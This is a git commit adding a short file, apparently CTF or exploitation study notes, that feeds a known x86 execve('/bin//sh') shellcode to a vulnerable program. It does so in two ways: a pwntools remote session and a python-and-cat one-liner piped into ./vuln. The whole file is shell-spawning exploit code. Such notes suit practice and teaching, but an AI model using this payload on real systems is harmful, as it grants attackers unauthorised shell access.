a6b28558ad13ed58945990d4b9c36126e735f2fd
fareedfauzi <56353946+fareedfauzi@users.noreply.github.com>
2020-01-06 06:04:49 +0800

    Create Shellcode-feeding.py

---
+++ Python/Shellcode-feeding.py
@@ -0,0 +1,15 @@
+2 types
+- Using pwntool
+- Using python command
+
+# using pwntool
+from pwn import *
+pwning = remote('adresss', port)
+
+shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+pwning.sendline(shellcode)
+pwning.interactive()
+
+
+# using python command
+( python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'" ; cat ) | ./vuln
